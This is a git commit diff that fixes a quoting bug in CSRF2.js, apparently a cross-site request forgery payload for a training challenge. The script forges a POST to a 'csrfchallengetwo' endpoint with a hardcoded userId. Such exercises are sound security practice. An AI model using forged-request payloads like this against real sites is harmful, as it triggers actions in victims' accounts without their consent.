9a0b046e85cdc651b310182615286b13f1e75b43
rosa-kelley <rosa.kelley34@gmail.com>
2021-02-15 02:53:14 +0000

    Update CSRF2.js

--- CSRF2.js
+++ CSRF2.js
@@ -4,7 +4,7 @@ var xhr = new XMLHttpRequest();
 xhr.open("POST", "/user/csrfchallengetwo/plusplus/", true);
 xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.send(JSON.stringify({
-    userId: bc0b85a52bc83d2672aecf82fb695665fca2f921
+    userId: "bc0b85a52bc83d2672aecf82fb695665fca2f921"
 }));
 };
 
